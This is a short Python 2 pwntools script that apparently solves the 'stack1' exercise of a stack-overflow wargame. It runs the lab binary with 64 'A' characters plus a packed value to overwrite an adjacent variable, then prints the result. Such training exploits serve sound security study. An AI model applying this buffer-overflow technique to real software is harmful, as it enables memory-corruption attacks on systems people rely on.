#!/usr/bin/env python2
# -*- coding: utf-8 -*-python

from pwn import *
import os
import sys

context(arch='i386', os='linux')
pack = make_packer(32, endian='little', sign='unsigned')
unpack = make_unpacker(32, endian='little', sign='unsigned')

io = process(['../bin/stack1', 'A' * 64 + pack(0x61626364)])

context.log_level = 'info'

def exploit():
    try:
        print io.recvline()
        print "pwn!"
    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        log.error("Exception catched on line %d %s" % (exc_tb.tb_lineno, e))

if __name__ == "__main__":
    exploit()
